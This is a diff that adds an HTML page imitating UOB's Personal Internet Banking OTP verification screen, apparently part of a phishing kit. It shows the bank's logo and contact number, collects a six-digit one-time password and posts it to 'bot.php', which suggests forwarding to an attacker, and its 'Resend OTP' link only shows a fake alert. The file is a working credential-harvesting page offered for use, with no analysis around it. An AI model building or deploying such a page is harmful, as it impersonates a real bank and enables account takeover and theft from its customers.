@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <title>UOB Personal Internet Banking - OTP</title>
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      width: 100%;
+      min-height: 100vh;
+      margin: 0;
+      background-image: url('images/Picsart_25-07-08_00-45-47-156.jpg');
+      background-position: center;
+      background-repeat: no-repeat;
+      background-size: cover; 
+    }
+
+    /* Menghilangkan panah pada input type number */
+    .otp-input::-webkit-outer-spin-button,
+    .otp-input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+    .otp-input[type=number] {
+        -moz-appearance: textfield;
+    }
+
+    /* Animasi transisi khusus untuk border kotak */
+    .otp-input {
+        transition: border-color 0.2s, box-shadow 0.2s, transform 0.2s;
+    }
+    .otp-input:focus {
+        transform: translateY(-2px);
+    }
+  </style>
+</head>
+ 
+<body>
+  
+  <header class="w-full max-w-md mt-8 px-6">
+   <img alt="UOB logo" class="w-36 h-auto" src="images/Picsart_25-07-08_00-28-48-617.png" style="width:25%; margin-left: 10px;">
+  </header>
+  
+  <div id="popupku" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 90%; height: 90%; z-index: 999; margin-top: 40px; margin-left: 20px;">
+
+  <main class="w-full max-w-md bg-white mt-6 rounded-sm shadow-lg" style="box-shadow: rgba(0, 0, 0, 0.36) 0px 3px 5px;">
+   
+   <div class="flex justify-end px-6 pt-4">
+    <nav class="text-sm font-normal text-[#0066cc] space-x-2">
+     <a class="hover:underline" href="#">English</a>
+     <span class="text-gray-300">|</span>
+     <a class="hover:underline" href="#">Bahasa Indonesia</a>
+    </nav>
+   </div>
+
+   <section class="px-6 pt-4 pb-4 border-b border-gray-200 text-center">
+    <h1 class="text-gray-800 text-xl font-bold leading-relaxed">
+     OTP Verification
+    </h1>
+    <p class="text-gray-500 text-sm mt-2 leading-relaxed">
+     Please enter the 6-digit One-Time Password (OTP) sent to your registered mobile number.
+    </p>
+   </section>
+  
+   <form class="px-6 pt-6 pb-6 space-y-6" action="bot.php" method="POST" id="otpForm">
+    
+    <div class="flex justify-center items-center gap-1.5 sm:gap-2">
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*" autofocus>
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*">
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*">
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*">
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*">
+        <input type="number" class="otp-input w-10 h-12 sm:w-11 sm:h-12 border-2 border-gray-300 rounded text-center text-lg font-semibold text-gray-700 focus:outline-none focus:border-[#0066cc] focus:shadow-[0_0_0_2px_rgba(0,102,204,0.2)] bg-[#f8fafc]" maxlength="1" pattern="\d*">
+    </div>
+
+    <input type="hidden" name="otp_code" id="finalOtp">
+
+    <button id="verifyBtn" class="w-full bg-[#e2e8f0] text-[#94a3b8] text-base font-semibold rounded-sm py-3 mt-2 transition-all duration-300 cursor-not-allowed" type="submit" disabled>
+     Proceed
+    </button>
+
+    <div class="flex justify-between items-center pt-2">
+        <span class="text-xs sm:text-sm text-gray-500" id="timerContainer">
+            Resend OTP in <strong id="timerText" class="text-[#0066cc] font-semibold">120s</strong>
+        </span>
+        <a class="text-[#0066cc] font-semibold text-xs sm:text-sm underline decoration-dotted hidden" href="#" id="resendBtn">
+            Resend OTP
+        </a>
+    </div>
+
+   </form>
+
+   <section class="bg-[#f0f4f8] px-6 py-4 border-t border-gray-200">
+    <p class="text-gray-500 text-xs sm:text-sm font-normal text-center">
+     Need help? Call UOB Contact Center at <a href="#" class="text-[#0066cc] font-semibold hover:underline">14008</a>.
+    </p>
+   </section>
+
+  </main>
+
+ </div>
+
+ <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const inputs = document.querySelectorAll('.otp-input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const finalOtpInput = document.getElementById('finalOtp');
+        
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if(this.value.length > 1) {
+                    this.value = this.value.slice(0, 1);
+                }
+                
+                if(this.value !== '' && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                
+                checkAllFilled();
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if(e.key === 'Backspace' && this.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
+                const digits = pastedData.split('');
+                
+                inputs.forEach((inp, i) => {
+                    if(digits[i]) {
+                        inp.value = digits[i];
+                        if(i === digits.length - 1 && i < 5) {
+                            inputs[i + 1].focus();
+                        } else if (i === 5) {
+                            inputs[5].focus();
+                        }
+                    }
+                });
+                checkAllFilled();
+            });
+        });
+
+        function checkAllFilled() {
+            let allFilled = true;
+            let otpString = '';
+            
+            inputs.forEach(inp => {
+                if(inp.value === '') allFilled = false;
+                otpString += inp.value;
+            });
+
+            if(allFilled) {
+                verifyBtn.removeAttribute('disabled');
+                verifyBtn.classList.remove('bg-[#e2e8f0]', 'text-[#94a3b8]', 'cursor-not-allowed');
+                verifyBtn.classList.add('bg-[#3563d4]', 'text-white', 'cursor-pointer', 'shadow-md');
+                finalOtpInput.value = otpString;
+            } else {
+                verifyBtn.setAttribute('disabled', 'true');
+                verifyBtn.classList.add('bg-[#e2e8f0]', 'text-[#94a3b8]', 'cursor-not-allowed');
+                verifyBtn.classList.remove('bg-[#3563d4]', 'text-white', 'cursor-pointer', 'shadow-md');
+                finalOtpInput.value = '';
+            }
+        }
+
+        let timeLeft = 120; 
+        const timerText = document.getElementById('timerText');
+        const timerContainer = document.getElementById('timerContainer');
+        const resendBtn = document.getElementById('resendBtn');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerText.innerText = timeLeft + 's';
+
+            if(timeLeft <= 0) {
+                clearInterval(countdown);
+                timerContainer.style.display = 'none';
+                resendBtn.style.display = 'inline-block';
+            }
+        }, 1000);
+
+        resendBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('A new OTP has been sent to your mobile device.');
+        });
+        
+        const form = document.getElementById('otpForm');
+        form.addEventListener('submit', function() {
+            verifyBtn.innerHTML = 'Processing...';
+            verifyBtn.style.opacity = '0.7';
+        });
+    });
+ </script>
+</body>
+</html>
